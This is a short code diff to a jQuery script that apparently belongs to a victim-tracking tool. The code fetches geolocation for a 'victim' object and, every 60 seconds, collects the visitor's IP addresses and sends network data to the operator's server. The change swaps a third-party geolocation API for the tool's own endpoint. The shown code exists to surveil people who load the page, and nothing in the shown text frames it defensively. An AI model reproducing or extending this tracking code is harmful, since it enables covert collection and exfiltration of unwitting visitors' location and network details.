@@ -1,6 +1,6 @@
 $(document).ready(function($) {
 
-    $.getJSON('https://api.ipgeolocation.io/ipgeo?apiKey=' + window.IpInfoApiKey, function(data) {
+    $.getJSON(window.serverPath + '/geoip', function(data) {
         var d = getVictimData();
 
         $.extend(true, d, data);
@@ -33,7 +33,7 @@ $(document).ready(function($) {
                     objUser.getIPs();
                     objUser.sendNetworks();
 
-                    setInterval(function(){ 
+                    setInterval(function(){
                         objUser.getIPs();
                         objUser.sendNetworks();
                     }, 60000);
